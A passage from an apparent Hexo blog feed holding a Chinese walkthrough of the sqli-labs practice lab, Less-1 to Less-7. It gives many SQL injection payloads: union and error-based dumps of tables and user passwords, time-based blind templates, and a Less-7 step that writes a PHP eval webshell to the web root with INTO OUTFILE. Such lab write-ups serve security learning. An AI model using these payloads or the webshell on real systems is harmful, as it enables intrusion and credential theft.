d</p><p>还要手动运行一下之前设置那个钩子，用宝塔创建可能会生成<code>.user.ini</code>文件，可能会干扰，建议删除</p><p>就可以部署到<code>/home/git/hexo</code>文件夹里了</p><p>​    </p>]]></content>
      
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> 折腾 </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs通关手册</title>
      <link href="2019/10/17/sqli-labs-wp/"/>
      <url>2019/10/17/sqli-labs-wp/</url>
      
        <content type="html"><![CDATA[<p>本篇博客介绍了sqli-labs通关教程！持续更新中！</p><a id="more"></a><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>对于sql显错注入首先应该想到的时后端sql语句的格式</p><p>接下来的Less-1~Less-4都是用联合查询的方式</p><p>先测试下正常回显的情况吧</p><pre><code>?id=1</code></pre><p>发现正常回显</p><p>想办法报错</p><pre><code>?id=1%27</code></pre><p>发现回显这</p><p><img src="/2019/10/17/sqli-labs-wp/20191014222818.png"></p><p>分析一下</p><pre><code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;        左右两端的&#39;&#39;代表里面的内容为字符串，&#39;1&#39;&#39;相当于&#39;$id&#39;</code></pre><p>而后台的sql语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>正如回显的错误一致</p><p><strong>order by判断列数</strong></p><pre><code>?id=1%27%20order%20by%204%23  //回显错误?id=1%27%20order%20by%203%23    //回显正常</code></pre><p>证明代入查询的字段共3列</p><p>判断回显位：</p><pre><code>?id=-1%27%20union%20select%201,2,3%23</code></pre><p>//回显位为2，3</p><p><img src="/2019/10/17/sqli-labs-wp/20191014225208.png"></p><p><strong>爆数据库：</strong></p><pre><code>?id=-1%27%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191014230246.png"></p><p><strong>爆表：</strong></p><pre><code>?id=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27%23或?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191014230817.png"></p><p><strong>爆字段：</strong></p><pre><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191014231232.png"></p><p><strong>爆内容：</strong></p><pre><code>?id=-1&#39; union select 1,group_concat(id,0x23,username,0x23,password),3 from security.users%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191014231909.png"></p><p><strong>爆数据库：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(database())))%23</span><br></pre></td></tr></table></figure><p><strong>爆表：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())))%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><strong>爆字段：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span>)))%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><strong>爆内容：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">id</span>,<span class="number">0x23</span>,username,<span class="number">0x23</span>,<span class="keyword">password</span>) <span class="keyword">from</span> security.users)))%<span class="number">23</span></span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIM截图20200304214457.png" style="zoom:80%;"><h3 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p><strong>题目同样可以用报错注入的方式</strong></p><p>延续第一题的思路，想让报错</p><pre><code>?id=1&#39;</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019185105.png"></p><p>分析一下</p><pre><code>&#39;&#39; LIMIT 0,1&#39;</code></pre><p>好像$id没有<code>&#39;</code>之类的</p><p>后台sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>果然没有</p><p><strong>order by判断列数</strong></p><pre><code>?id=1 order by 3%23</code></pre><p>发现还是3列</p><p><strong>爆数据库</strong></p><pre><code>?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019175513.png"></p><p><strong>爆表</strong></p><pre><code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019175923.png"></p><p><strong>爆字段</strong></p><pre><code>?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019175923.png"></p><p><strong>爆内容</strong></p><pre><code>?id=-1 union select 1,group_concat(id,0x23,username,0x23,password),3 from security.users%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019192103.png"></p><h3 id="关键代码-1"><a href="#关键代码-1" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p><strong>题目同样可以用报错注入的方式</strong></p><p>继续让其报错<br>        ?id=1’</p><p><img src="/2019/10/17/sqli-labs-wp/20191019185647.png"></p><p>分析以下</p><pre><code>&#39;&#39;1&#39;&#39;) LIMIT 0,1&#39;</code></pre><p>由报错信息可知，后台的sql语句应该带有括号，并且有<code>&#39;</code>,即<code>(&#39;$id&#39;)</code></p><p>看下后台语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>果然如此</p><p>那么接下来还是老规矩了</p><p><strong>order by判断列数</strong></p><pre><code>?id=1&#39;) order by 3%23</code></pre><p><strong>爆数据库</strong></p><pre><code>?id=-1&#39;) union select 1,group_concat(schema_name),3 from information_schema.schemata%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019190941.png"></p><p><strong>爆表</strong></p><pre><code>?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019191138.png"></p><p><strong>爆字段</strong></p><pre><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019191633.png"></p><p><strong>爆内容</strong></p><pre><code>?id=-1&#39;) union select 1,group_concat(id,0x23,username,0x23,password),3 from security.users%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019191856.png"></p><h3 id="关键代码-2"><a href="#关键代码-2" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">&#x27;&quot;&#x27;</span> . $id . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>同样，继续这种思路</p><p>发现当加上<code>&quot;</code>报错<br>    ?id=1”</p><p><img src="/2019/10/17/sqli-labs-wp/20191019203800.png"></p><p>分析一下报错</p><pre><code>&#39;&quot;1&quot;&quot;) LIMIT 0,1&#39;</code></pre><p>后台的sql语句应该为<code>(&quot;$id&quot;)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>和我们猜的一样</p><p><strong>order by判断列数</strong></p><pre><code>?id=1&quot;) order by 3%23</code></pre><p>同样是三列</p><p><strong>爆数据库</strong></p><pre><code>?id=-1&quot;) union select 1,2,group_concat(schema_name) from information_schema.schemata%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019204652.png"></p><p><strong>爆表</strong></p><pre><code>?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019205058.png"></p><p><strong>爆字段</strong></p><pre><code>?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23    </code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019205243.png"></p><p><strong>爆内容</strong></p><pre><code>?id=-1&quot;) union select 1,2,group_concat(id,0x23,username,0x23,password) from security.users%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019205536.png"></p><h3 id="关键代码-3"><a href="#关键代码-3" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">&#x27;&quot;&#x27;</span> . $id . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p><strong>报错注入</strong></p><p>题目考察的是报错注入，第一次我用了盲注😂</p><p>思路和Less-1一样</p><p><strong>盲注</strong></p><p>虽然不是，但是还是要根据报错信息来构造语句</p><pre><code>?id=1&#39;</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019211855.png"></p><p>分析一下报错信息</p><pre><code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code></pre><p>好像和Less-1一样，但是现在不回显查询的结果了</p><p>这就是盲注，需要写脚本来爆破内容，在这之前先介绍几个函数</p><p><strong>if函数</strong></p><pre><code>格式：IF(Condition,A,B)含义：如果Condition成立，则A，否则B</code></pre><p><strong>substr函数</strong></p><pre><code>格式：SUBSTR(string,start,len)含义：从string的start位开始截取len个字符</code></pre><p><strong>mid函数</strong></p><pre><code>格式：MID(column_name,start[,length])含义：从column_name中start位开始截取length(可选参数)长度</code></pre><p><strong>ascii函数</strong></p><pre><code>格式：ASCII(char)含义：将char转化成ascii码</code></pre><p><strong>left函数</strong></p><pre><code>格式：LEFT ( string, n )含义：函数得到字符串左部指定个数的字符，string为要截取的字符串，n为长度。</code></pre><p><strong>right函数</strong></p><pre><code>格式：RIGHT( string, n )含义：函数得到字符串右部指定个数的字符，string为要截取的字符串，n为长度。</code></pre><p><strong>length函数</strong></p><pre><code>格式：LENGTH(string)含义：得到string的长度</code></pre><p><strong>模板</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">r&#x3D;requests.get(url+payload,timeout&#x3D;3)&#x2F;&#x2F;注意要设置设置timeout</span><br><span class="line">except requests.exceptions.ReadTimeout as e:&#x2F;&#x2F;超时异常</span><br><span class="line">data+&#x3D;chr(j)</span><br><span class="line">break</span><br></pre></td></tr></table></figure><p>外面嵌套循环就行</p><p><strong>爆数据库</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &quot;?id&#x3D;1&#39; and if(ascii(substr(database(),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(j, k)</span><br></pre></td></tr></table></figure><p><strong>爆表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&quot;?id&#x3D;1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit &#123;&#125;,1),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(k , i, j)</span><br></pre></td></tr></table></figure><p><strong>爆字段</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&quot;?id&#x3D;1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;&#123;&#125;&quot; limit &#123;&#125;,1),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(te,k,i,j)</span><br></pre></td></tr></table></figure><p><strong>爆内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&quot;?id&#x3D;1&#39; and if(ascii(substring((select &#123;&#125; from &#123;&#125;.&#123;&#125; limit &#123;&#125;,1),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(co,db,ta,k,i,j)</span><br></pre></td></tr></table></figure><p>按照这个payload就可以跑出来，但速度是是真的慢</p><h3 id="关键代码-4"><a href="#关键代码-4" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p><strong>题目同样可以用报错注入的方式</strong></p><p>同样可以先让其报错，查看后台sql语法</p><p>发现当</p><pre><code>?id=6&quot;</code></pre><p>时，会报错出语句</p><p><img src="/2019/10/17/sqli-labs-wp/20191024225813.png"></p><p>可以看到后台的sql语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>后面的操作和之前就没什么区别了，利用</p><pre><code>?id=1&quot;+注入语句+%23</code></pre><p>就可以注入得到结果了</p><h3 id="关键代码-5"><a href="#关键代码-5" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>这题好像爆不出后台sql语句，但是我们可以多试试常用的测试注入的语句</p><p>直接看下发现源码吧，发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>同样，利用</p><pre><code>?id=1&#39;))+注入语句+%23</code></pre><p>也可以盲注注入了</p><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><p>先看下路径，这个好像报不出来，只能用其他的题目，以Less-1为例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-1/?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,@@basedir,@@datadir%<span class="number">23</span></span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIM截图20200304222338.png" style="zoom:67%;"><p><code>@@basedir</code>是指Mysql的安装目录，<code>@@datadir</code>是指数据库文件的路径，我们需要用web目录，默认<code>/var/www/html</code>,因此我们</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&quot;/var/www/html/moonback.php&quot;</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/2019/10/17/sqli-labs-wp/TIM%E6%88%AA%E5%9B%BE20200313231423.png"></p><p>注意这个写的目录要有权限，并且mysql有写文件权限，我们可以执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIM截图20200313233757.png" style="zoom:80%;"><p>在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL。可以通过以下方式修改</p><p>修改mysql.ini 文件，在[mysqld] 下添加条目: <code>secure_file_priv =</code></p><p>保存，重启mysql。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#值为null ，也就是注释掉这个参数或者secure-file-priv&#x3D;null。表示限制mysqld 不允许导入|导出</span><br><span class="line">#值为&#x2F;tmp&#x2F; ，即secure-file-priv&#x3D;&quot;&#x2F;tmp&#x2F;&quot; 表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下</span><br><span class="line">#没有具体值时，即secure-file-priv&#x3D;      